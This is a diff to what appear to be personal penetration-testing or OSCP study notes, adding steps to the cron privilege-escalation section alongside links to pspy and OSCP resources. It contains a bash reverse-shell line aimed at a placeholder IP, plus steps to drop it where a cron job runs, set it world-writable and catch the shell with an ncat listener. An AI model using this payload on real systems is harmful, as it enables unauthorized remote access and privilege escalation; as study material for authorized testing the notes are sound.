@@ -244,8 +244,11 @@ https://github.com/DominicBreuker/pspy
  
  ### CRON
   If you're unfamiliar with crontab schedule expression, you can use https://crontab.guru.
+ <br /> 
+ get the reverse shell, check what crone job is being run. Create a file with that name and put this inside:
  - #!/bin/bash<br />
 bash -i >& /dev/tcp/IP/9999 0>&1
+ - After transferring it to the target, I set every permission with chmod 777 NameOfFile  and set up my ncat listener on port 9999.
  ### Cool links: 
  https://arnavtripathy98.medium.com/my-oscp-struggle-210a4496ffe8
  - https://guif.re/linuxeop
